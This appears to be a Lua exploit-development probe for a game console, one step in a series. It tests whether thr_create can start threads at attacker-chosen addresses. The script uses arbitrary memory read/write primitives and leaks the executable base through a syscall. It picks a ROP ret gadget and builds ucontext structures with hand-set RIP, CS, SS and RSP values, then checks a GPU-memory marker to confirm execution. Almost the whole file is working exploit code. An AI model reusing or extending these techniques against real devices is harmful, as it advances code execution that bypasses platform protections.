-- CRASH_CLASS: HIGH
-- PROBE 129a: thr_create(430) with CORRECT ucontext offsets
--
-- 80a used wrong offsets (CS at +0x98 instead of +0xE8) and got rv=-1
-- with valid TIDs, no panic. This probe uses the CORRECT offsets from
-- the 128a getcontext dump:
--   mcontext starts at ctx+0x40
--   mc_rip    = ctx+0xE0
--   mc_cs     = ctx+0xE8  (0x43)
--   mc_rflags = ctx+0xF0  (0x202)
--   mc_rsp    = ctx+0xF8
--   mc_ss     = ctx+0x100 (0x3B)
--   mc_len    = ctx+0x108 (0x480)
--
-- Thread entry: ret gadget → pops marker from stack → writes to GPU
-- If thread runs: GPU marker changes. If it doesn't: stays 0xDEAD.

print("=== PROBE 129a: thr_create CORRECT OFFSETS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_thr_create = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc624 = make_syscall(624)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot=" .. hex(eboot_base))

local ret_gadget = eboot_base + 0x42
print("[0] ret_gadget=" .. hex(ret_gadget))

-- CORRECT ucontext offsets
local MC = 0x40
local MC_RDI    = MC + 0x08  -- 0x48
local MC_RSI    = MC + 0x10  -- 0x50
local MC_RDX    = MC + 0x18  -- 0x58
local MC_RAX    = MC + 0x38  -- 0x78
local MC_RBP    = MC + 0x48  -- 0x88
local MC_RIP    = MC + 0xA0  -- 0xE0
local MC_CS     = MC + 0xA8  -- 0xE8
local MC_RFLAGS = MC + 0xB0  -- 0xF0
local MC_RSP    = MC + 0xB8  -- 0xF8
local MC_SS     = MC + 0xC0  -- 0x100
local MC_LEN    = MC + 0xC8  -- 0x108

-- GPU mmap for thread stack and markers
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))

local MARKER = gpu + 0x00       -- thread writes here to prove it ran
local THREAD_STACK = gpu + 0x8000  -- 32KB thread stack

--------------------------------------------------------------------
-- SECTION A: thr_create with correct CS/SS at correct offsets
-- Thread entry: just a ret gadget → pops 0 → SIGSEGV
-- We check if the TID is valid and if the marker changes
--------------------------------------------------------------------
print("")
print("--- SECTION A: thr_create with correct offsets ---")

-- Set marker
wq(MARKER, uint64(0xDEAD))
print("[A] marker_before=" .. hex(rq(MARKER)))

-- Build ucontext
local CTX_SIZE = 0x500
local ctx = memory.alloc(CTX_SIZE)
zero(ctx, CTX_SIZE)

-- Thread stack: put 0 at top (ret will pop this → SIGSEGV)
local stack_top = THREAD_STACK + 0x7F00
wq(stack_top, uint64(0))  -- return address for ret gadget

-- Set correct context fields
wq(ctx + MC_RIP, ret_gadget)          -- thread starts at ret
wq(ctx + MC_CS, uint64(0x43))        -- user code segment
wq(ctx + MC_RFLAGS, uint64(0x202))   -- IF=1, bit1=1
wq(ctx + MC_RSP, stack_top)          -- thread stack
wq(ctx + MC_SS, uint64(0x3B))        -- user stack segment
wq(ctx + MC_LEN, uint64(0x480))      -- context length

-- Also set RBP to something valid
wq(ctx + MC_RBP, stack_top)

-- TID output buffer
local tid_buf = memory.alloc(8)
zero(tid_buf, 8)

print("[A] ctx: RIP=" .. hex(rq(ctx + MC_RIP))
    .. " CS=" .. hex(rq(ctx + MC_CS))
    .. " RSP=" .. hex(rq(ctx + MC_RSP))
    .. " SS=" .. hex(rq(ctx + MC_SS)))

local pre_624 = to_num(sc624())

local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)

print("[A] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. hex(rv_tc))
local tid_val = rq(tid_buf)
print("[A] tid=" .. hex(tid_val))
print("[A] pid_check=" .. to_num(sc20()))

-- Wait a moment (busy loop) for thread to run
for i = 1, 10000 do
    local _ = to_num(sc624())
end

local post_624 = to_num(sc624())
print("[A] 624: pre=" .. pre_624 .. " post=" .. post_624 .. " delta=" .. (post_624 - pre_624))
print("[A] marker_after=" .. hex(rq(MARKER)))

-- Check stack modification
local stk0 = rq(stack_top)
print("[A] stack[0]=" .. hex(stk0))

--------------------------------------------------------------------
-- SECTION B: Use getcontext as template for thr_create
-- Get a valid context first, then modify for thread
--------------------------------------------------------------------
print("")
print("--- SECTION B: getcontext-based thr_create ---")

local sc_getcontext = make_syscall(421)
local ctx_b = memory.alloc(CTX_SIZE)
zero(ctx_b, CTX_SIZE)

local ok_gc, rv_gc = pcall(function()
    return sc_getcontext(uint64(ctx_b))
end)
print("[B] getcontext: ok=" .. tostring(ok_gc) .. " rv=" .. hex(rv_gc))

if ok_gc and to_num(rv_gc) == 0 then
    -- Copy the valid context for thread
    local ctx_t = memory.alloc(CTX_SIZE)
    for off = 0, CTX_SIZE - 4, 4 do
        wd(ctx_t + off, rd(ctx_b + off) or 0)
    end

    -- Modify only what needs to change for the thread
    local stack_b = THREAD_STACK + 0x6000
    wq(stack_b, uint64(0))  -- return address

    wq(ctx_t + MC_RIP, ret_gadget)
    wq(ctx_t + MC_RSP, stack_b)

    print("[B] ctx: RIP=" .. hex(rq(ctx_t + MC_RIP))
        .. " CS=" .. hex(rq(ctx_t + MC_CS))
        .. " RSP=" .. hex(rq(ctx_t + MC_RSP)))

    wq(MARKER, uint64(0xDEAD))
    local tid_b = memory.alloc(8)
    zero(tid_b, 8)

    local ok_tc2, rv_tc2 = pcall(function()
        return sc_thr_create(uint64(ctx_t), uint64(tid_b), uint64(0))
    end)

    print("[B] thr_create: ok=" .. tostring(ok_tc2) .. " rv=" .. hex(rv_tc2))
    print("[B] tid=" .. hex(rq(tid_b)))
    print("[B] pid_check=" .. to_num(sc20()))

    -- Wait
    for i = 1, 10000 do
        local _ = to_num(sc624())
    end

    print("[B] marker=" .. hex(rq(MARKER)))
    print("[B] stack[0]=" .. hex(rq(stack_b)))
end

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 129a COMPLETE ===")
